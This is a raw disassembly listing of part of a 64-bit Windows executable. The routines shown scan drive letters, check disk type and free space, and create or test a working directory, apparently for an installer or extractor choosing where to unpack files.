   14000665a:	85 c0                	test   %eax,%eax
   14000665c:	75 2e                	jne    0x14000668c
   14000665e:	39 05 9c 66 00 00    	cmp    %eax,0x669c(%rip)        # 0x14000cd00
   140006664:	74 22                	je     0x140006688
   140006666:	21 05 94 66 00 00    	and    %eax,0x6694(%rip)        # 0x14000cd00
   14000666c:	48 8b cb             	mov    %rbx,%rcx
   14000666f:	48 ff 15 02 2c 00 00 	rex.W call *0x2c02(%rip)        # 0x140009278
   140006676:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000667b:	eb 0b                	jmp    0x140006688
   14000667d:	e8 7e 10 00 00       	call   0x140007700
   140006682:	89 05 bc 6e 00 00    	mov    %eax,0x6ebc(%rip)        # 0x14000d544
   140006688:	33 c0                	xor    %eax,%eax
   14000668a:	eb 0c                	jmp    0x140006698
   14000668c:	83 25 b1 6e 00 00 00 	andl   $0x0,0x6eb1(%rip)        # 0x14000d544
   140006693:	b8 01 00 00 00       	mov    $0x1,%eax
   140006698:	48 8b 8c 24 60 01 00 	mov    0x160(%rsp),%rcx
   14000669f:	00 
   1400066a0:	48 33 cc             	xor    %rsp,%rcx
   1400066a3:	e8 c8 1d 00 00       	call   0x140008470
   1400066a8:	4c 8d 9c 24 70 01 00 	lea    0x170(%rsp),%r11
   1400066af:	00 
   1400066b0:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   1400066b4:	49 8b 73 20          	mov    0x20(%r11),%rsi
   1400066b8:	49 8b e3             	mov    %r11,%rsp
   1400066bb:	5f                   	pop    %rdi
   1400066bc:	c3                   	ret
   1400066bd:	cc                   	int3
   1400066be:	cc                   	int3
   1400066bf:	cc                   	int3
   1400066c0:	cc                   	int3
   1400066c1:	cc                   	int3
   1400066c2:	cc                   	int3
   1400066c3:	cc                   	int3
   1400066c4:	48 8b c4             	mov    %rsp,%rax
   1400066c7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400066cb:	48 89 70 10          	mov    %rsi,0x10(%rax)
   1400066cf:	48 89 78 18          	mov    %rdi,0x18(%rax)
   1400066d3:	4c 89 60 20          	mov    %r12,0x20(%rax)
   1400066d7:	55                   	push   %rbp
   1400066d8:	41 56                	push   %r14
   1400066da:	41 57                	push   %r15
   1400066dc:	48 8d 68 88          	lea    -0x78(%rax),%rbp
   1400066e0:	48 81 ec 60 01 00 00 	sub    $0x160,%rsp
   1400066e7:	48 8b 05 1a 59 00 00 	mov    0x591a(%rip),%rax        # 0x14000c008
   1400066ee:	48 33 c4             	xor    %rsp,%rax
   1400066f1:	48 89 45 50          	mov    %rax,0x50(%rbp)
   1400066f5:	45 33 c0             	xor    %r8d,%r8d
   1400066f8:	48 8d 0d d9 31 00 00 	lea    0x31d9(%rip),%rcx        # 0x1400098d8
   1400066ff:	33 d2                	xor    %edx,%edx
   140006701:	e8 4a e9 ff ff       	call   0x140005050
   140006706:	b9 40 00 00 00       	mov    $0x40,%ecx
   14000670b:	8b f0                	mov    %eax,%esi
   14000670d:	8d 50 01             	lea    0x1(%rax),%edx
   140006710:	48 ff 15 b1 2c 00 00 	rex.W call *0x2cb1(%rip)        # 0x1400093c8
   140006717:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000671c:	33 db                	xor    %ebx,%ebx
   14000671e:	48 8b f8             	mov    %rax,%rdi
   140006721:	48 85 c0             	test   %rax,%rax
   140006724:	75 30                	jne    0x140006756
   140006726:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   14000672a:	45 33 c9             	xor    %r9d,%r9d
   14000672d:	45 33 c0             	xor    %r8d,%r8d
   140006730:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140006737:	00 
   140006738:	ba b5 04 00 00       	mov    $0x4b5,%edx
   14000673d:	33 c9                	xor    %ecx,%ecx
   14000673f:	e8 88 e6 ff ff       	call   0x140004dcc
   140006744:	e8 b7 0f 00 00       	call   0x140007700
   140006749:	89 05 f5 6d 00 00    	mov    %eax,0x6df5(%rip)        # 0x14000d544
   14000674f:	33 c0                	xor    %eax,%eax
   140006751:	e9 e4 03 00 00       	jmp    0x140006b3a
   140006756:	44 8b c6             	mov    %esi,%r8d
   140006759:	48 8d 0d 78 31 00 00 	lea    0x3178(%rip),%rcx        # 0x1400098d8
   140006760:	48 8b d7             	mov    %rdi,%rdx
   140006763:	e8 e8 e8 ff ff       	call   0x140005050
   140006768:	85 c0                	test   %eax,%eax
   14000676a:	75 39                	jne    0x1400067a5
   14000676c:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140006770:	45 33 c9             	xor    %r9d,%r9d
   140006773:	45 33 c0             	xor    %r8d,%r8d
   140006776:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   14000677d:	00 
   14000677e:	ba b1 04 00 00       	mov    $0x4b1,%edx
   140006783:	33 c9                	xor    %ecx,%ecx
   140006785:	e8 42 e6 ff ff       	call   0x140004dcc
   14000678a:	48 8b cf             	mov    %rdi,%rcx
   14000678d:	48 ff 15 dc 2a 00 00 	rex.W call *0x2adc(%rip)        # 0x140009270
   140006794:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006799:	c7 05 a1 6d 00 00 14 	movl   $0x80070714,0x6da1(%rip)        # 0x14000d544
   1400067a0:	07 07 80 
   1400067a3:	eb aa                	jmp    0x14000674f
   1400067a5:	48 8d 15 fc 30 00 00 	lea    0x30fc(%rip),%rdx        # 0x1400098a8
   1400067ac:	48 8b cf             	mov    %rdi,%rcx
   1400067af:	48 ff 15 1a 2c 00 00 	rex.W call *0x2c1a(%rip)        # 0x1400093d0
   1400067b6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400067bb:	8b 0d 9f 76 00 00    	mov    0x769f(%rip),%ecx        # 0x14000de60
   1400067c1:	41 be 01 00 00 00    	mov    $0x1,%r14d
   1400067c7:	85 c0                	test   %eax,%eax
   1400067c9:	41 0f 44 ce          	cmove  %r14d,%ecx
   1400067cd:	89 0d 8d 76 00 00    	mov    %ecx,0x768d(%rip)        # 0x14000de60
   1400067d3:	48 8b cf             	mov    %rdi,%rcx
   1400067d6:	48 ff 15 93 2a 00 00 	rex.W call *0x2a93(%rip)        # 0x140009270
   1400067dd:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400067e2:	8a 05 36 66 00 00    	mov    0x6636(%rip),%al        # 0x14000ce1e
   1400067e8:	84 c0                	test   %al,%al
   1400067ea:	74 4b                	je     0x140006837
   1400067ec:	3c 5c                	cmp    $0x5c,%al
   1400067ee:	75 0b                	jne    0x1400067fb
   1400067f0:	38 05 29 66 00 00    	cmp    %al,0x6629(%rip)        # 0x14000ce1f
   1400067f6:	44 8b c3             	mov    %ebx,%r8d
   1400067f9:	74 03                	je     0x1400067fe
   1400067fb:	45 8b c6             	mov    %r14d,%r8d
   1400067fe:	33 d2                	xor    %edx,%edx
   140006800:	48 8d 0d 17 66 00 00 	lea    0x6617(%rip),%rcx        # 0x14000ce1e
   140006807:	e8 d8 fc ff ff       	call   0x1400064e4
   14000680c:	85 c0                	test   %eax,%eax
   14000680e:	0f 85 fb 02 00 00    	jne    0x140006b0f
   140006814:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140006818:	45 33 c9             	xor    %r9d,%r9d
   14000681b:	45 33 c0             	xor    %r8d,%r8d
   14000681e:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140006825:	00 
   140006826:	ba be 04 00 00       	mov    $0x4be,%edx
   14000682b:	33 c9                	xor    %ecx,%ecx
   14000682d:	e8 9a e5 ff ff       	call   0x140004dcc
   140006832:	e9 18 ff ff ff       	jmp    0x14000674f
   140006837:	39 1d c7 64 00 00    	cmp    %ebx,0x64c7(%rip)        # 0x14000cd04
   14000683d:	0f 85 d1 02 00 00    	jne    0x140006b14
   140006843:	39 1d 17 76 00 00    	cmp    %ebx,0x7617(%rip)        # 0x14000de60
   140006849:	0f 85 c5 02 00 00    	jne    0x140006b14
   14000684f:	4c 8d 3d ba 6d 00 00 	lea    0x6dba(%rip),%r15        # 0x14000d610
   140006856:	41 bc 04 01 00 00    	mov    $0x104,%r12d
   14000685c:	49 8b d7             	mov    %r15,%rdx
   14000685f:	41 8b cc             	mov    %r12d,%ecx
   140006862:	48 ff 15 bf 2a 00 00 	rex.W call *0x2abf(%rip)        # 0x140009328
   140006869:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000686e:	85 c0                	test   %eax,%eax
   140006870:	74 3b                	je     0x1400068ad
   140006872:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   140006878:	41 8b d6             	mov    %r14d,%edx
   14000687b:	49 8b cf             	mov    %r15,%rcx
   14000687e:	e8 61 fc ff ff       	call   0x1400064e4
   140006883:	85 c0                	test   %eax,%eax
   140006885:	0f 85 84 02 00 00    	jne    0x140006b0f
   14000688b:	49 8b cf             	mov    %r15,%rcx
   14000688e:	e8 d5 bb ff ff       	call   0x140002468
   140006893:	85 c0                	test   %eax,%eax
   140006895:	75 16                	jne    0x1400068ad
   140006897:	45 8b c6             	mov    %r14d,%r8d
   14000689a:	41 8b d6             	mov    %r14d,%edx
   14000689d:	49 8b cf             	mov    %r15,%rcx
   1400068a0:	e8 3f fc ff ff       	call   0x1400064e4
   1400068a5:	85 c0                	test   %eax,%eax
   1400068a7:	0f 85 62 02 00 00    	jne    0x140006b0f
   1400068ad:	48 8d 35 e8 30 00 00 	lea    0x30e8(%rip),%rsi        # 0x14000999c
   1400068b4:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   1400068b9:	48 2b f0             	sub    %rax,%rsi
   1400068bc:	49 8b d4             	mov    %r12,%rdx
   1400068bf:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400068c4:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   1400068cb:	48 85 c0             	test   %rax,%rax
   1400068ce:	74 11                	je     0x1400068e1
   1400068d0:	8a 04 0e             	mov    (%rsi,%rcx,1),%al
   1400068d3:	84 c0                	test   %al,%al
   1400068d5:	74 0a                	je     0x1400068e1
   1400068d7:	88 01                	mov    %al,(%rcx)
   1400068d9:	49 03 ce             	add    %r14,%rcx
   1400068dc:	49 2b d6             	sub    %r14,%rdx
   1400068df:	75 e3                	jne    0x1400068c4
   1400068e1:	48 85 d2             	test   %rdx,%rdx
   1400068e4:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   1400068e8:	48 0f 45 c1          	cmovne %rcx,%rax
   1400068ec:	88 18                	mov    %bl,(%rax)
   1400068ee:	80 7c 24 40 5a       	cmpb   $0x5a,0x40(%rsp)
   1400068f3:	0f 8f e2 01 00 00    	jg     0x140006adb
   1400068f9:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400068fe:	48 ff 15 c3 29 00 00 	rex.W call *0x29c3(%rip)        # 0x1400092c8
   140006905:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000690a:	8b f8                	mov    %eax,%edi
   14000690c:	83 f8 06             	cmp    $0x6,%eax
   14000690f:	74 05                	je     0x140006916
   140006911:	83 f8 03             	cmp    $0x3,%eax
   140006914:	75 1a                	jne    0x140006930
   140006916:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000691b:	48 ff 15 e6 28 00 00 	rex.W call *0x28e6(%rip)        # 0x140009208
   140006922:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006927:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000692a:	0f 85 8d 00 00 00    	jne    0x1400069bd
   140006930:	83 ff 02             	cmp    $0x2,%edi
   140006933:	75 78                	jne    0x1400069ad
   140006935:	8a 4c 24 40          	mov    0x40(%rsp),%cl
   140006939:	8d 41 bf             	lea    -0x41(%rcx),%eax
   14000693c:	41 3a c6             	cmp    %r14b,%al
   14000693f:	76 70                	jbe    0x1400069b1
   140006941:	89 5c 24 34          	mov    %ebx,0x34(%rsp)
   140006945:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140006949:	89 5c 24 3c          	mov    %ebx,0x3c(%rsp)
   14000694d:	89 5c 24 38          	mov    %ebx,0x38(%rsp)
   140006951:	84 c9                	test   %cl,%cl
   140006953:	74 5c                	je     0x1400069b1
   140006955:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   14000695a:	4c 8d 4c 24 3c       	lea    0x3c(%rsp),%r9
   14000695f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006964:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140006969:	48 8d 54 24 34       	lea    0x34(%rsp),%rdx
   14000696e:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006973:	48 ff 15 f6 2a 00 00 	rex.W call *0x2af6(%rip)        # 0x140009470
   14000697a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000697f:	85 c0                	test   %eax,%eax
   140006981:	74 2a                	je     0x1400069ad
   140006983:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   140006987:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   14000698d:	0f af 4c 24 34       	imul   0x34(%rsp),%ecx
   140006992:	8b 54 24 38          	mov    0x38(%rsp),%edx
   140006996:	48 ff 15 db 2a 00 00 	rex.W call *0x2adb(%rip)        # 0x140009478
   14000699d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400069a2:	85 c0                	test   %eax,%eax
   1400069a4:	74 07                	je     0x1400069ad
   1400069a6:	3d 00 90 01 00       	cmp    $0x19000,%eax
   1400069ab:	73 10                	jae    0x1400069bd
   1400069ad:	8a 4c 24 40          	mov    0x40(%rsp),%cl
   1400069b1:	41 02 ce             	add    %r14b,%cl
   1400069b4:	88 4c 24 40          	mov    %cl,0x40(%rsp)
   1400069b8:	e9 15 01 00 00       	jmp    0x140006ad2
   1400069bd:	45 33 c0             	xor    %r8d,%r8d
   1400069c0:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400069c5:	41 8d 50 03          	lea    0x3(%r8),%edx
   1400069c9:	e8 d6 02 00 00       	call   0x140006ca4
   1400069ce:	85 c0                	test   %eax,%eax
   1400069d0:	75 22                	jne    0x1400069f4
   1400069d2:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400069d7:	e8 8c ba ff ff       	call   0x140002468
   1400069dc:	85 c0                	test   %eax,%eax
   1400069de:	75 cd                	jne    0x1400069ad
   1400069e0:	45 33 c0             	xor    %r8d,%r8d
   1400069e3:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400069e8:	41 8b d6             	mov    %r14d,%edx
   1400069eb:	e8 b4 02 00 00       	call   0x140006ca4
   1400069f0:	85 c0                	test   %eax,%eax
   1400069f2:	74 b9                	je     0x1400069ad
   1400069f4:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400069f9:	e8 6a ba ff ff       	call   0x140002468
   1400069fe:	85 c0                	test   %eax,%eax
   140006a00:	74 14                	je     0x140006a16
   140006a02:	41 8b d4             	mov    %r12d,%edx
   140006a05:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006a0a:	48 ff 15 3f 28 00 00 	rex.W call *0x283f(%rip)        # 0x140009250
   140006a11:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006a16:	4c 8d 05 83 2f 00 00 	lea    0x2f83(%rip),%r8        # 0x1400099a0
   140006a1d:	41 8b d4             	mov    %r12d,%edx
   140006a20:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006a25:	e8 7e 11 00 00       	call   0x140007ba8
   140006a2a:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006a2f:	48 ff 15 d2 27 00 00 	rex.W call *0x27d2(%rip)        # 0x140009208
   140006a36:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006a3b:	83 f8 ff             	cmp    $0xffffffff,%eax
   140006a3e:	75 15                	jne    0x140006a55
   140006a40:	33 d2                	xor    %edx,%edx
   140006a42:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006a47:	48 ff 15 42 28 00 00 	rex.W call *0x2842(%rip)        # 0x140009290
   140006a4e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006a53:	eb 03                	jmp    0x140006a58
   140006a55:	83 e0 10             	and    $0x10,%eax
   140006a58:	85 c0                	test   %eax,%eax
   140006a5a:	75 11                	jne    0x140006a6d
   140006a5c:	8a 4c 24 40          	mov    0x40(%rsp),%cl
   140006a60:	41 02 ce             	add    %r14b,%cl
   140006a63:	88 5c 24 43          	mov    %bl,0x43(%rsp)
   140006a67:	88 4c 24 40          	mov    %cl,0x40(%rsp)
   140006a6b:	eb 65                	jmp    0x140006ad2
   140006a6d:	ba 02 00 00 00       	mov    $0x2,%edx
   140006a72:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006a77:	48 ff 15 da 27 00 00 	rex.W call *0x27da(%rip)        # 0x140009258
   140006a7e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006a83:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140006a88:	49 8b d4             	mov    %r12,%rdx
   140006a8b:	4d 2b c7             	sub    %r15,%r8
   140006a8e:	49 8b cf             	mov    %r15,%rcx
   140006a91:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   140006a98:	48 85 c0             	test   %rax,%rax
   140006a9b:	74 12                	je     0x140006aaf
   140006a9d:	42 8a 04 01          	mov    (%rcx,%r8,1),%al
   140006aa1:	84 c0                	test   %al,%al
   140006aa3:	74 0a                	je     0x140006aaf
   140006aa5:	88 01                	mov    %al,(%rcx)
   140006aa7:	49 03 ce             	add    %r14,%rcx
   140006aaa:	49 2b d6             	sub    %r14,%rdx
   140006aad:	75 e2                	jne    0x140006a91
   140006aaf:	48 85 d2             	test   %rdx,%rdx
   140006ab2:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140006ab6:	41 8b d6             	mov    %r14d,%edx
   140006ab9:	48 0f 45 c1          	cmovne %rcx,%rax
   140006abd:	45 33 c0             	xor    %r8d,%r8d
   140006ac0:	49 8b cf             	mov    %r15,%rcx
   140006ac3:	88 18                	mov    %bl,(%rax)
   140006ac5:	e8 1a fa ff ff       	call   0x1400064e4
   140006aca:	85 c0                	test   %eax,%eax
   140006acc:	75 41                	jne    0x140006b0f
   140006ace:	8a 4c 24 40          	mov    0x40(%rsp),%cl
   140006ad2:	80 f9 5a             	cmp    $0x5a,%cl
   140006ad5:	0f 8e 1e fe ff ff    	jle    0x1400068f9
   140006adb:	41 8b d4             	mov    %r12d,%edx
   140006ade:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006ae3:	48 ff 15 66 27 00 00 	rex.W call *0x2766(%rip)        # 0x140009250
   140006aea:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006aef:	ba 03 00 00 00       	mov    $0x3,%edx
   140006af4:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006af9:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   140006afd:	e8 a2 01 00 00       	call   0x140006ca4
   140006b02:	85 c0                	test   %eax,%eax
   140006b04:	0f 84 45 fc ff ff    	je     0x14000674f
   140006b0a:	e9 ad fd ff ff       	jmp    0x1400068bc
   140006b0f:	41 8b c6             	mov    %r14d,%eax
   140006b12:	eb 26                	jmp    0x140006b3a
   140006b14:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140006b19:	4c 8d 0d 10 ca ff ff 	lea    -0x35f0(%rip),%r9        # 0x140003530
   140006b20:	45 33 c0             	xor    %r8d,%r8d
   140006b23:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140006b28:	ba d2 07 00 00       	mov    $0x7d2,%edx
   140006b2d:	e8 96 0f 00 00       	call   0x140007ac8
   140006b32:	48 85 c0             	test   %rax,%rax
   140006b35:	0f 95 c3             	setne  %bl
   140006b38:	8b c3                	mov    %ebx,%eax
   140006b3a:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140006b3e:	48 33 cc             	xor    %rsp,%rcx
   140006b41:	e8 2a 19 00 00       	call   0x140008470
   140006b46:	4c 8d 9c 24 60 01 00 	lea    0x160(%rsp),%r11
   140006b4d:	00 
   140006b4e:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   140006b52:	49 8b 73 28          	mov    0x28(%r11),%rsi
   140006b56:	49 8b 7b 30          	mov    0x30(%r11),%rdi
   140006b5a:	4d 8b 63 38          	mov    0x38(%r11),%r12
   140006b5e:	49 8b e3             	mov    %r11,%rsp
   140006b61:	41 5f                	pop    %r15
   140006b63:	41 5e                	pop    %r14
   140006b65:	5d                   	pop    %rbp
   140006b66:	c3                   	ret
   140006b67:	cc                   	int3
   140006b68:	cc                   	int3
   140006b69:	cc                   	int3
   140006b6a:	cc                   	int3
   140006b6b:	cc                   	int3
   140006b6c:	cc                   	int3
   140006b6d:	cc                   	int3
   140006b6e:	cc                   	int3
   140006b6f:	cc                   	int3
   140006b70:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006b75:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140006b7a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140006b7f:	57                   	push   %rdi
   140006b80:	48 83 ec 40          	sub    $0x40,%rsp
   140006b84:	48 8b f9             	mov    %rcx,%rdi
   140006b87:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
   140006b8b:	48 ff c3             	inc    %rbx
   140006b8e:	80 3c 19 00          	cmpb   $0x0,(%rcx,%rbx,1)
   140006b92:	75 f7                	jne    0x140006b8b
   140006b94:	83 c3 14             	add    $0x14,%ebx
   140006b97:	b9 40 00 00 00       	mov    $0x40,%ecx
   140006b9c:	8b d3                	mov    %ebx,%edx
   140006b9e:	8b eb                	mov    %ebx,%ebp
   140006ba0:	48 ff 15 21 28 00 00 	rex.W call *0x2821(%rip)        # 0x1400093c8
   140006ba7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006bac:	48 8b f0             	mov    %rax,%rsi
   140006baf:	48 85 c0             	test   %rax,%rax
   140006bb2:	75 41                	jne    0x140006bf5
   140006bb4:	21 44 24 28          	and    %eax,0x28(%rsp)
   140006bb8:	45 33 c9             	xor    %r9d,%r9d
   140006bbb:	45 33 c0             	xor    %r8d,%r8d
   140006bbe:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140006bc5:	00 
   140006bc6:	ba b5 04 00 00       	mov    $0x4b5,%edx
   140006bcb:	33 c9                	xor    %ecx,%ecx
   140006bcd:	e8 fa e1 ff ff       	call   0x140004dcc
   140006bd2:	e8 29 0b 00 00       	call   0x140007700
   140006bd7:	89 05 67 69 00 00    	mov    %eax,0x6967(%rip)        # 0x14000d544
   140006bdd:	33 c0                	xor    %eax,%eax
   140006bdf:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140006be4:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140006be9:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140006bee:	48 83 c4 40          	add    $0x40,%rsp
   140006bf2:	5f                   	pop    %rdi
   140006bf3:	c3                   	ret
   140006bf4:	cc                   	int3
   140006bf5:	4c 8b c7             	mov    %rdi,%r8
   140006bf8:	48 8b d5             	mov    %rbp,%rdx
   140006bfb:	48 8b ce             	mov    %rsi,%rcx
   140006bfe:	e8 05 a4 ff ff       	call   0x140001008
   140006c03:	4c 8d 05 a6 2d 00 00 	lea    0x2da6(%rip),%r8        # 0x1400099b0
   140006c0a:	8b d3                	mov    %ebx,%edx
   140006c0c:	48 8b ce             	mov    %rsi,%rcx
   140006c0f:	e8 94 0f 00 00       	call   0x140007ba8
   140006c14:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140006c1a:	bd 01 00 00 00       	mov    $0x1,%ebp
   140006c1f:	c7 44 24 28 80 00 00 	movl   $0x4000080,0x28(%rsp)
   140006c26:	04 
   140006c27:	45 33 c9             	xor    %r9d,%r9d
   140006c2a:	45 33 c0             	xor    %r8d,%r8d
   140006c2d:	89 6c 24 20          	mov    %ebp,0x20(%rsp)
   140006c31:	ba 00 00 00 40       	mov    $0x40000000,%edx
   140006c36:	48 8b ce             	mov    %rsi,%rcx
   140006c39:	48 ff 15 f8 26 00 00 	rex.W call *0x26f8(%rip)        # 0x140009338
   140006c40:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006c45:	48 8b ce             	mov    %rsi,%rcx
   140006c48:	48 8b d8             	mov    %rax,%rbx
   140006c4b:	48 ff 15 1e 26 00 00 	rex.W call *0x261e(%rip)        # 0x140009270
   140006c52:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006c57:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   140006c5b:	0f 84 71 ff ff ff    	je     0x140006bd2
   140006c61:	48 8b cb             	mov    %rbx,%rcx
   140006c64:	48 ff 15 cd 25 00 00 	rex.W call *0x25cd(%rip)        # 0x140009238
   140006c6b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006c70:	48 8b cf             	mov    %rdi,%rcx
   140006c73:	48 ff 15 8e 25 00 00 	rex.W call *0x258e(%rip)        # 0x140009208
   140006c7a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006c7f:	83 f8 ff             	cmp    $0xffffffff,%eax
   140006c82:	0f 84 4a ff ff ff    	je     0x140006bd2
   140006c88:	a8 10                	test   $0x10,%al
   140006c8a:	0f 84 42 ff ff ff    	je     0x140006bd2
   140006c90:	83 25 ad 68 00 00 00 	andl   $0x0,0x68ad(%rip)        # 0x14000d544
   140006c97:	8b c5                	mov    %ebp,%eax
   140006c99:	e9 41 ff ff ff       	jmp    0x140006bdf
   140006c9e:	cc                   	int3
   140006c9f:	cc                   	int3
   140006ca0:	cc                   	int3
   140006ca1:	cc                   	int3
   140006ca2:	cc                   	int3
   140006ca3:	cc                   	int3
   140006ca4:	48 8b c4             	mov    %rsp,%rax
   140006ca7:	48 89 58 10          	mov    %rbx,0x10(%rax)
   140006cab:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140006caf:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140006cb3:	55                   	push   %rbp
   140006cb4:	41 54                	push   %r12
   140006cb6:	41 55                	push   %r13
   140006cb8:	41 56                	push   %r14
   140006cba:	41 57                	push   %r15
   140006cbc:	48 8d a8 58 fd ff ff 	lea    -0x2a8(%rax),%rbp
   140006cc3:	48 81 ec 80 03 00 00 	sub    $0x380,%rsp
   140006cca:	48 8b 05 37 53 00 00 	mov    0x5337(%rip),%rax        # 0x14000c008
   140006cd1:	48 33 c4             	xor    %rsp,%rax
   140006cd4:	48 89 85 70 02 00 00 	mov    %rax,0x270(%rbp)
   140006cdb:	44 8b e2             	mov    %edx,%r12d
   140006cde:	48 8b f9             	mov    %rcx,%rdi
   140006ce1:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140006ce6:	b9 04 01 00 00       	mov    $0x104,%ecx
   140006ceb:	45 8b f8             	mov    %r8d,%r15d
   140006cee:	48 ff 15 13 26 00 00 	rex.W call *0x2613(%rip)        # 0x140009308
   140006cf5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006cfa:	48 8b cf             	mov    %rdi,%rcx
   140006cfd:	48 ff 15 1c 26 00 00 	rex.W call *0x261c(%rip)        # 0x140009320
   140006d04:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006d09:	33 c9                	xor    %ecx,%ecx
   140006d0b:	45 33 ed             	xor    %r13d,%r13d
   140006d0e:	85 c0                	test   %eax,%eax
   140006d10:	75 2d                	jne    0x140006d3f
   140006d12:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   140006d17:	45 33 c9             	xor    %r9d,%r9d
   140006d1a:	45 33 c0             	xor    %r8d,%r8d
   140006d1d:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140006d24:	00 
   140006d25:	ba bc 04 00 00       	mov    $0x4bc,%edx
   140006d2a:	e8 9d e0 ff ff       	call   0x140004dcc
   140006d2f:	e8 cc 09 00 00       	call   0x140007700
   140006d34:	89 05 0a 68 00 00    	mov    %eax,0x680a(%rip)        # 0x14000d544
   140006d3a:	e9 aa 02 00 00       	jmp    0x140006fe9
   140006d3f:	48 8d 44 24 4c       	lea    0x4c(%rsp),%rax
   140006d44:	44 89 6c 24 44       	mov    %r13d,0x44(%rsp)
   140006d49:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   140006d4e:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006d53:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140006d58:	44 89 6c 24 40       	mov    %r13d,0x40(%rsp)
   140006d5d:	48 8d 54 24 44       	lea    0x44(%rsp),%rdx
   140006d62:	44 89 6c 24 48       	mov    %r13d,0x48(%rsp)
   140006d67:	44 89 6c 24 4c       	mov    %r13d,0x4c(%rsp)
   140006d6c:	48 ff 15 fd 26 00 00 	rex.W call *0x26fd(%rip)        # 0x140009470
   140006d73:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006d78:	85 c0                	test   %eax,%eax
   140006d7a:	0f 84 e3 01 00 00    	je     0x140006f63
   140006d80:	44 8b 74 24 40       	mov    0x40(%rsp),%r14d
   140006d85:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   140006d8b:	44 0f af 74 24 44    	imul   0x44(%rsp),%r14d
   140006d91:	8b 54 24 48          	mov    0x48(%rsp),%edx
   140006d95:	41 8b ce             	mov    %r14d,%ecx
